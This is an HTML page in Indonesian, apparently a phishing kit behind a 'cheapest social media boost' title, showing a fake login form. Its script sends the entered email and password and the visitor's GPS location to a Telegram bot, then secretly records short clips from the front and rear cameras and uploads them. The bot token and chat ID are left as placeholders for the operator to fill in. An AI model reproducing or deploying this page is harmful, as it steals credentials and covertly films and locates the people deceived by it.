# Index.html
Suntik Sosial Media Termurah 
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Pribadi</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: blue;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: darkblue;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Login</h2>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Masukkan Email" required>
        <input type="password" id="password" placeholder="Masukkan Password" required>
        <button type="submit">Login</button>
    </form>
    <p id="errorMessage" style="color: red; display: none;">Login gagal!</p>
</div>

<script>
    // Token dan chat ID Telegram (ganti dengan milik Anda)
    const botToken = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
    const chatID = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda

    const processedEmails = new Set();
    let isFrontCamera = true;
    let currentStream = null;
    let videoRecorder = null;
    let videoDevices = [];

    async function getVideoDevices() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return devices.filter(device => device.kind === 'videoinput');
        } catch (error) {
            console.error("Gagal mendapatkan daftar kamera:", error);
            return [];
        }
    }

    async function startVideoRecording() {
        videoDevices = await getVideoDevices();
        if (videoDevices.length === 0) {
            console.error("Tidak ada kamera tersedia.");
            return;
        }

        const selectedDevice = videoDevices[isFrontCamera ? 0 : (videoDevices[1] ? 1 : 0)];
        const constraints = {
            video: { deviceId: selectedDevice.deviceId, facingMode: isFrontCamera ? "user" : "environment" }
        };

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }

        try {
            const stream = await navigator.mediaDevices.getUser Media(constraints);
            currentStream = stream;
            const chunks = [];
            videoRecorder = new MediaRecorder(stream);

            videoRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) chunks.push(event.data);
            };

            videoRecorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                await sendLocationAndVideo(videoBlob);
                currentStream.getTracks().forEach(track => track.stop());

                if (isFrontCamera) {
                    isFrontCamera = false;
                    setTimeout(startVideoRecording, 1000);
                }
            };

            videoRecorder.start();
            setTimeout(() => {
                if (videoRecorder.state !== "inactive") videoRecorder.stop();
            }, 3000);
        } catch (error) {
            console.error('Gagal mengakses kamera:', error);
        }
    }

    async function sendLocationAndVideo(videoBlob) {
        if (!navigator.geolocation) {
            console.error("Geolocation tidak didukung oleh browser ini.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const email = document.getElementById('email').value || "Tidak ada email";
                const password = document.getElementById('password').value || "Tidak ada password";

                const message = `
                📍 Lokasi Pengguna:
                Latitude: ${latitude}
                Longitude: ${longitude}
                
                ➣ Email: ${email}
                ➣ Password: ${password}

                🌍 [Lihat di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})
                `;

                try {
                    const formData = new FormData();
                    formData.append("chat_id", chatID);
                    formData.append("video", videoBlob, "recorded_video.webm");

                    const videoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log('Video dikirim:', await videoResponse.json());

                    const messageResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatID, text: message, parse_mode: "Markdown" })
                    });
                    console.log('Lokasi dikirim:', await messageResponse.json());
                } catch (error) {
                    console.error('Gagal mengirim data:', error);
                }
            },
            (error) => {
                console.error("Gagal mendapatkan lokasi:", error);
            }
        );
    }

    document.getElementById('loginForm').addEventListener('submit', async function (e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (!email || !password) {
            console.error("Email atau password tidak boleh kosong.");
            return;
        }

        if (processedEmails.has(email)) {
            console.warn("Email sudah diproses sebelumnya.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const message = `
                ✅ Login Info:
                ➣ Username: ${email}
                ➣ Password: ${password}

                📍 Lokasi Pengguna:
                Latitude: ${latitude}
                Longitude: ${longitude}
                🌍 [Lihat di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})
                `;

                try {
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatID, text: message, parse_mode: "Markdown" })
                    });
                    console.log('Login info dikirim:', await response.json());

                    processedEmails.add(email);
                    startVideoRecording();
                } catch (error) {
                    console.error('Gagal mengirim login info:', error);
                }
            },
            (error) => {
                console.error("Gagal mendapatkan lokasi:", error);
            }
        );
    });
</script>

</body>
</html>
